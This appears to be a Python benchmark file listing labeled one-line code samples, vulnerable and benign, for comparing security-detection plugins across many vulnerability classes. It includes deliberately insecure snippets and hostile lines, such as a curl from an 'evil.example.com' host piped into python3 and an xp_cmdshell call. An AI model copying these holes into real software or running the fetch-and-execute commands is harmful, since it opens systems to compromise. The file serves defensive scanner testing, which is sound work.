"""Labeled benchmark corpus for the plugin detection comparison.

Design rules (so the comparison is fair and auditable):
- TP cases (vulnerable=True) are the UNION of both tools' documented detection
  classes plus independent edge cases. Each case is tagged with the CWE family.
- FP cases (vulnerable=False) are everyday CORRECT code, including tricky
  near-misses from both tools' own false-positive lists. A tool that flags a
  benign case gets an FP.
- "semantic" cases are classes NO regex can prove (race, business logic). They
  are reported separately - they measure nothing about the pattern layers.

Every case: (case_id, path, content, category, vulnerable)
"""

CASES = []
def V(path, content, category):
    CASES.append((path, content, category, True))
def B(path, content, category):
    CASES.append((path, content, category, False))

# ===================== TRUE POSITIVES =====================

# --- SQL injection (CWE-89) ---
V("app/db1.py", 'cur.execute(f"SELECT * FROM users WHERE id={uid}")', "sqli")
V("app/db2.py", 'cur.execute("SELECT * FROM t WHERE id=" + str(x))', "sqli")
V("app/db3.py", 'cur.execute("SELECT * FROM t WHERE id=%s" % x)', "sqli")
V("app/db4.py", 'cur.execute("SELECT * FROM t WHERE id={}".format(x))', "sqli")
V("app/db5.js", "db.query(`SELECT * FROM t WHERE id=${x}`)", "sqli")
V("app/db6.js", "db.query('SELECT * FROM t WHERE id=' + x)", "sqli")
V("app/db7.go", 'db.Query(fmt.Sprintf("SELECT * FROM t WHERE id=%s", id))', "sqli")
V("app/db8.rs", 'sqlx::query(&format!("SELECT * FROM t WHERE id={}", id))', "sqli")
V("app/db9.java", 'em.createQuery("SELECT u FROM User u WHERE u.name = \'" + name + "\'")', "sqli")
V("app/db10.py", 'User.objects.raw("SELECT * FROM t WHERE id=%s" % uid)', "sqli")
V("app/db11.go", 'db.Raw("SELECT * FROM t WHERE name = \'" + name + "\'").Scan(&out)', "sqli")
V("app/db12.rb", 'User.where("name = \'#{params[:name]}\'")', "sqli")
V("app/db13.php", '$q = "SELECT * FROM t WHERE id=" . $_GET["id"]; mysqli_query($c, $q);', "sqli")
V("app/db14.xml", '<select id="getUser">SELECT * FROM t WHERE id = ${id}</select>', "sqli")

# --- OS command injection (CWE-78) ---
V("app/c1.py", 'os.system(f"ping {host}")', "cmdi")
V("app/c2.py", 'subprocess.run(f"ping {host}", shell=True)', "cmdi")
V("app/c3.py", 'os.popen("cat " + user_path)', "cmdi")
V("app/c4.js", 'const {exec} = require("child_process"); exec(`ping ${host}`)', "cmdi")
V("app/c5.js", 'execSync("convert " + filename)', "cmdi")
V("app/c6.go", 'exec.Command("sh", "-c", "ping -c 1 " + host)', "cmdi")
V("app/c7.rb", 'out = `ping #{host}`', "cmdi")
V("app/c8.php", 'system("ping " . $_GET["h"]);', "cmdi")
V("app/c9.nim", 'discard execCmd("ping " & host)', "cmdi")
V("app/c10.cr", '`ping #{host}`', "cmdi")
V("app/c11.clj", '(sh "sh" "-c" (str "ping " host))', "cmdi")
V("app/c12.hs", 'callCommand ("ping " ++ host)', "cmdi")
V("app/c13.jl", 'run(`sh -c $cmd`)', "cmdi")
V("app/c14.zig", '.argv = &.{ "sh", "-c", payload }', "cmdi")
V("app/c15.Jenkinsfile", 'sh "deploy ${params.BRANCH}"', "cmdi")
V("app/c16.yml", '- shell: ping {{ target }}', "cmdi")
V("app/c17.sql", "EXEC master..xp_cmdshell 'dir c:\\'", "cmdi")

# --- Unsafe deserialization (CWE-502) ---
V("app/d1.py", 'data = pickle.loads(blob)', "deser")
V("app/d2.py", 'cfg = yaml.load(open(path))', "deser")
V("app/d3.py", 'm = torch.load("model.pt")', "deser")
V("app/d4.py", 'm = torch.load("model.pt", weights_only=False)', "deser")
V("app/d5.py", 'arr = np.load("x.npy", allow_pickle=True)', "deser")
V("app/d6.py", 'obj = joblib.load("model.joblib")', "deser")
V("app/d7.py", 'df = pandas.read_pickle("frame.pkl")', "deser")
V("app/d8.java", 'Object o = ois.readObject();', "deser")
V("app/d9.php", '$o = unserialize($_GET["x"]);', "deser")
V("app/d10.rb", 'obj = Marshal.load(data)', "deser")
V("app/d11.js", 'const obj = require("node-serialize").unserialize(req.body.data)', "deser")
V("app/d12.py", 'shelve.open("cache.db")', "deser")
V("app/d13.py", 'cloudpickle.loads(payload)', "deser")
V("app/d14.py", 'dill.loads(payload)', "deser")
V("app/d15.java", 'Object o = new XStream().fromXML(xml);', "deser")
V("app/d16.py", 'keras.models.load_model("model.h5")  # contains Lambda layer', "deser")

# --- XSS (CWE-79) ---
V("app/x1.js", 'el.innerHTML = user + data', "xss")
V("app/x2.js", 'el.outerHTML = comment', "xss")
V("app/x3.js", 'el.insertAdjacentHTML("beforeend", html)', "xss")
V("app/x4.jsx", '<div dangerouslySetInnerHTML={{__html: body}} />', "xss")
V("app/x5.js", 'document.write(location.hash)', "xss")
V("app/x6.py", 'return render_template_string("<h1>Hello " + name + "</h1>")', "xss")
V("app/x7.html", '{{ user_comment|safe }}', "xss")
V("app/x8.go", 't.Execute(w, template.HTML(userInput))', "xss")
V("app/x9.php", 'echo {!! $comment !!};', "xss")
V("app/x10.rb", '<%= raw @comment %>', "xss")
V("app/x11.java", 'out.print("<td>" + request.getParameter("name") + "</td>");', "xss")
V("app/x12.kt", 'webView.loadData("<html>" + userContent + "</html>", "text/html", null)', "xss")

# --- Hardcoded secrets (CWE-798/321) ---
V("app/s1.py", 'AWS_SECRET = "AKIAIOSFODNN7EXAMPLE"', "secrets")
V("app/s2.py", 'GITHUB_TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"', "secrets")
V("app/s3.js", 'const key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow..."', "secrets")
V("app/s4.py", 'slack = "xoxb-1234567890-abcdefghijkl"', "secrets")
V("app/s5.js", 'const stripe = "sk_live_4eC39HqLyjWDarjtT1zdp7dc"', "secrets")
V("app/s6.py", 'JWT_SECRET = "s3cret-hardcoded-hmac-key"', "secrets")
V("app/s7.java", 'String ak = "LTAI5tGdstatic1234567890";', "secrets")
V("app/s8.py", 'DB = "postgres://admin:hunter2@db.internal:5432/prod"', "secrets")
V("app/s9.yml", 'password: "Sup3rS3cret!"', "secrets")
V("app/s10.groovy", 'git url: "https://user:passw0rd@git.corp/repo.git"', "secrets")

# --- Weak crypto / randomness (CWE-327/328/330) ---
V("app/k1.py", 'pw = hashlib.md5(password.encode()).hexdigest()', "crypto")
V("app/k2.py", 'h = hashlib.sha1(password.encode()).hexdigest()', "crypto")
V("app/k3.py", 'cipher = AES.new(key, AES.MODE_ECB)', "crypto")
V("app/k4.js", 'const token = Math.random().toString(36).slice(2)', "crypto")
V("app/k5.py", 'token = random.random()  # password-reset token', "crypto")
V("app/k6.go", 'token := rand.Intn(999999) // otp code', "crypto")
V("app/k7.php", '$token = md5(uniqid(mt_rand(), true));', "crypto")
V("app/k8.js", 'crypto.createCipher("aes-256-ecb", key)', "crypto")
V("app/k9.java", 'Cipher.getInstance("AES/ECB/PKCS5Padding")', "crypto")
V("app/k10.py", 'kdf = PBKDF2(password, salt, 1000)', "crypto")
V("app/k11.m", 'CCCrypt(kCCEncrypt, kCCOptionECBMode, ...)', "crypto")

# --- JWT / signature verification (CWE-347) ---
V("app/j1.py", 'jwt.decode(token, key, options={"verify_signature": False})', "jwt")
V("app/j2.go", 'claims := jwt.ParseUnverified(token)', "jwt")
V("app/j3.java", 'Jwt parser = Jwts.parser().parseClaimsJwt(unsigned);', "jwt")
V("app/j4.py", 'if razorpay_signature == computed_hash:', "jwt")

# --- Path traversal / LFI / zip-slip (CWE-22/98) ---
V("app/p1.py", 'open(os.path.join(UPLOAD_DIR, request.args["n"]), "rb")', "pathtrav")
V("app/p2.py", 'return send_file("/var/data/" + request.args["n"])', "pathtrav")
V("app/p3.py", 'zipfile.ZipFile("a.zip").extractall(dest)', "pathtrav")
V("app/p4.js", 'res.sendFile(path.join(__dirname, "files", req.params.name))', "pathtrav")
V("app/p5.php", 'include("pages/" . $_GET["page"] . ".php");', "pathtrav")
V("app/p6.py", 'tarfile.open("a.tgz").extractall(dest)', "pathtrav")

# --- SSRF (CWE-918) ---
V("app/r1.py", 'r = requests.get(f"https://{host}/api")', "ssrf")
V("app/r2.go", 'resp, _ := http.Get("https://" + target)', "ssrf")
V("app/r3.java", 'restTemplate.getForObject("https://" + host + "/x", String.class)', "ssrf")
V("app/r4.conf", 'proxy_pass http://$upstream;', "ssrf")
V("app/r5.js", 'module.exports = { images: { remotePatterns: [{ hostname: "**" }] } }', "ssrf")

# --- SSTI (CWE-1336) ---
V("app/t1.py", 'render_template_string(f"<p>{request.args["name"]}</p>")', "ssti")
V("app/t2.py", 'env.from_string("Hi " + name).render()', "ssti")
V("app/t3.java", 'return "user/profile :: (" + bio + ")";', "ssti")

# --- Open redirect (CWE-601) ---
V("app/o1.py", 'return redirect(request.args.get("next"))', "redirect")
V("app/o2.go", 'http.Redirect(w, r, r.URL.Query().Get("next"), 302)', "redirect")
V("app/o3.rb", 'redirect_to params[:next]', "redirect")

# --- NoSQL / LDAP / XPath injection (CWE-943/90/643) ---
V("app/n1.js", 'db.users.find({$where: "this.pw == \'" + pw + "\'"})', "nosql")
V("app/n2.py", 'filt = "(uid=" + username + ")"; conn.search_s(base, scope, filt)', "nosql")
V("app/n3.py", 'tree.findall(".//user[name=\'" + user + "\']")', "nosql")

# --- ReDoS (CWE-1333) ---
V("app/re1.py", 're.compile(r"(a+)+$")', "redos")
V("app/re2.js", 'new RegExp("(x|y)*.*z")', "redos")

# --- Mass assignment (CWE-915) ---
V("app/m1.py", 'class UserSerializer(serializers.ModelSerializer):\n    class Meta:\n        fields = "__all__"', "massassign")
V("app/m2.php", 'protected $guarded = [];', "massassign")
V("app/m3.rb", 'params.require(:user).permit!', "massassign")
V("app/m4.js", 'const u = new User({...req.body});', "massassign")

# --- XXE (CWE-611) ---
V("app/xx1.java", 'DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(xml)', "xxe")
V("app/xx2.java", 'XMLDecoder d = new XMLDecoder(new FileInputStream(f));', "xxe")
V("app/xx3.py", 'tree = ET.parse("user_supplied.xml")  # stdlib, entities resolved', "xxe")

# --- Header / log / CSV injection (CWE-113/117/1236) ---
V("app/h1.java", 'response.setHeader("X-Next", request.getParameter("next"));', "headerinj")
V("app/h2.py", 'logger.info("login: " + request.args["next"])', "headerinj")
V("app/h3.py", 'ws.append([request.form["name"]])', "csv")

# --- Eval / code injection (CWE-94/95/470) ---
V("app/e1.py", 'eval(request.args["expr"])', "eval")
V("app/e2.js", 'new Function("return " + userInput)()', "eval")
V("app/e3.py", 'exec(base64.b64decode(payload))', "eval")
V("app/e4.py", 'getattr(obj, request.args["method"])()', "eval")
V("app/e5.clj", '(eval (read-string user-input))', "eval")
V("app/e6.jl", 'eval(Meta.parse(user_input))', "eval")

# --- Insecure defaults / disabled controls (CWE-1188/489/732/942/295) ---
V("app/g1.py", 'app.run(debug=True)', "misconfig")
V("app/g2.py", 'DEBUG = True  # django settings', "misconfig")
V("app/g3.py", 'os.chmod(path, 0o777)', "misconfig")
V("app/g4.sh", 'chmod 777 /app/data', "misconfig")
V("app/g5.js", 'app.use(cors({origin: "*", credentials: true}))', "misconfig")
V("app/g6.py", 'requests.get(url, verify=False)', "misconfig")
V("app/g7.js", 'https.createServer({rejectUnauthorized: false})', "misconfig")
V("app/g8.go", '&tls.Config{InsecureSkipVerify: true}', "misconfig")
V("app/g9.py", '@csrf_exempt\ndef transfer(request): ...', "misconfig")
V("app/g10.py", 'ALLOWED_HOSTS = ["*"]', "misconfig")

# --- IaC / container / cloud (CWE-250/269/693/732/668) ---
V("app/i1.yml", 'securityContext:\n  privileged: true', "iac")
V("app/i2.yml", 'volumes:\n  - /var/run/docker.sock:/var/run/docker.sock', "iac")
V("app/i3.yml", 'cap_add: ["SYS_ADMIN"]', "iac")
V("app/i4.tf", 'cidr_blocks = ["0.0.0.0/0"]  # ssh ingress', "iac")
V("app/i5.bicep", 'publicNetworkAccess: \'Enabled\'', "iac")
V("app/i6.dockerfile", 'RUN curl -sSL https://get.example.com/install.sh | sh', "iac")
V("app/i7.tf", 'acl = "public-read-write"', "iac")

# --- Mobile (CWE-749/927/276/319) ---
V("app/mob1.kt", 'webView.addJavascriptInterface(Bridge(), "app")', "mobile")
V("app/mob2.kt", 'webSettings.allowUniversalAccessFromFileURLs = true', "mobile")
V("app/mob3.kt", 'openFileOutput("tok", Context.MODE_WORLD_READABLE)', "mobile")
V("app/mob4.kt", 'PendingIntent.getActivity(ctx, 0, i, PendingIntent.FLAG_MUTABLE)', "mobile")
V("app/mob5.plist", '<?xml version="1.0"?><plist><dict><key>NSAllowsArbitraryLoads</key><true/></dict></plist>', "mobile")

# --- Smart contracts (CWE-284/841) ---
V("app/sc1.sol", 'require(tx.origin == owner);', "contract")
V("app/sc2.sol", 'msg.sender.call{value: amount}(""); balances[msg.sender] = 0;', "contract")

# --- Supply chain (CWE-1104/829/494) ---
V("requirements.txt", 'reqeusts==2.31.0', "supply")
V("app/sup2.sh", 'curl https://evil.example.com/x.py | python3', "supply")
V("app/sup3.cmake", 'file(DOWNLOAD https://x.com/lib.tar.gz lib.tar.gz)  # no hash', "supply")

# --- GitHub Actions workflow (security-guidance home turf) ---
V(".github/workflows/ci.yml", 'on: issues\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "${{ github.event.issue.title }}"', "gha")

# --- SRI (security-guidance home turf) ---
V("app/page.html", '<script src="https://cdn.example.com/lib.js"></script>', "sri")

# ===================== BENIGN (FP guard) =====================

B("app/ok1.py", 'cur.execute("SELECT * FROM users WHERE id = %s", (uid,))', "benign-db")
B("app/ok2.js", "db.query('SELECT * FROM u WHERE id = ?', [id])", "benign-db")
B("app/ok3.go", 'db.Query("SELECT * FROM u WHERE id = $1", id)', "benign-db")
B("app/ok4.rs", 'sqlx::query("SELECT * FROM u WHERE id = $1").bind(id)', "benign-db")
B("app/ok5.java", 'PreparedStatement ps = c.prepareStatement("SELECT * FROM u WHERE id=?");', "benign-db")
B("app/ok6.py", 'subprocess.run(["git", "status"], check=True)', "benign-cmd")
B("app/ok7.py", 'subprocess.run(["ffmpeg", "-i", path, out], timeout=30)', "benign-cmd")
B("app/ok8.js", 'execFile("convert", [filename], cb)', "benign-cmd")
B("app/ok9.go", 'exec.Command("ping", "-c", "1", host)', "benign-cmd")
B("app/ok10.py", 'digest = hashlib.sha256(file_bytes).hexdigest()', "benign-crypto")
B("app/ok11.py", 'import bcrypt; bcrypt.hashpw(pw.encode(), bcrypt.gensalt(12))', "benign-crypto")
B("app/ok12.py", 'import secrets; token = secrets.token_urlsafe(32)', "benign-crypto")
B("app/ok13.py", 'dice = random.randint(1, 6)', "benign-crypto")
B("app/ok14.js", 'const id = crypto.randomUUID()', "benign-crypto")
B("app/ok15.py", 'DB_PASSWORD = os.environ["DB_PASSWORD"]', "benign-secrets")
B("app/ok16.js", 'const key = process.env.STRIPE_KEY', "benign-secrets")
B("app/ok17.py", 'API_KEY = "<your-api-key-here>"', "benign-secrets")
B("app/ok18.py", 'cfg = yaml.safe_load(open(path))', "benign-deser")
B("app/ok19.py", 'cfg = yaml.load(open(path), Loader=yaml.SafeLoader)', "benign-deser")
B("app/ok20.py", 'm = torch.load("model.pt", weights_only=True)', "benign-deser")
B("app/ok21.py", 'blob = pickle.dumps(obj)', "benign-deser")
B("app/ok22.js", 'el.textContent = userInput', "benign-xss")
B("app/ok23.jsx", '<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(x)}} />', "benign-xss")
B("app/ok24.js", 'el.innerHTML = DOMPurify.sanitize(userHtml)', "benign-xss")
B("app/ok25.py", 'return render_template("profile.html", user=user)', "benign-xss")
B("app/ok26.py", 'value = ast.literal_eval(expr)', "benign-eval")
B("app/ok27.py", 'model.eval()  # torch eval mode', "benign-eval")
B("app/ok28.py", 'result = calc.evaluate(safe_ast)', "benign-eval")
B("app/ok29.py", 'os.path.join(BASE_DIR, "static", "app.css")', "benign-path")
B("app/ok30.py", 'return send_from_directory(UPLOAD_DIR, name)', "benign-path")
B("app/ok31.py", 'requests.get(url, timeout=10)', "benign-net")
B("app/ok32.py", 'requests.get("https://api.github.com/user", timeout=5)', "benign-net")
B("app/ok33.py", 'os.chmod(path, 0o600)', "benign-perms")
B("app/ok34.py", 'logger.info("user %s logged in", username)', "benign-log")
B("app/ok35.py", 'defusedxml.ElementTree.parse("user.xml")', "benign-xxe")
B("app/ok36.js", '<script src="https://cdn.example.com/lib.js" integrity="sha384-abc" crossorigin="anonymous"></script>', "benign-sri")
B("app/ok37.py", 'jwt.decode(token, key, algorithms=["HS256"])', "benign-jwt")
B("app/ok38.go", 'n := rand.Intn(len(shards))  // load balancing pick', "benign-crypto")
B("app/ok39.c", 'char buf[64];\nsnprintf(buf, sizeof(buf), "%s", name);', "benign-c")
B("app/ok40.py", 'arr.filter(lambda x: x > 0)', "benign-misc")
B("app/ok41.py", 'barcode = generate_barcode(product_id)', "benign-misc")
B("app/ok42.js", 'const password_field = document.getElementById("pw")', "benign-misc")
B("app/ok43.py", 'os.system("ls -la")', "benign-cmd")
B("app/ok44.py", 'eval("1 + 2")  # static expression', "benign-eval")
B("app/ok45.yml", 'steps:\n  - run: echo "$TITLE"\n    env:\n      TITLE: ${{ github.event.issue.title }}', "benign-gha")
B("app/ok46.py", 'hmac.compare_digest(a, b)', "benign-jwt")
B("app/ok47.py", 'except ValueError:\n    logging.exception("parse failed")', "benign-misc")
B("app/ok48.js", 'const merged = {...defaults, ...options}', "benign-misc")
B("app/ok49.py", 'img = np.load("x.npy")  # allow_pickle defaults False', "benign-deser")
B("app/ok50.py", 'with open(os.path.join(d, "report.txt")) as f: ...', "benign-path")

# ===================== SEMANTIC (reported separately, not scored) =====================
V("app/sem1.py", 'bal = get_balance(uid)\nif bal >= amount:\n    set_balance(uid, bal - amount)', "semantic-race")
V("app/sem2.py", 'qty = int(request.form["qty"])\ncharge(user, qty * price)  # no qty>0 check', "semantic-bizlogic")
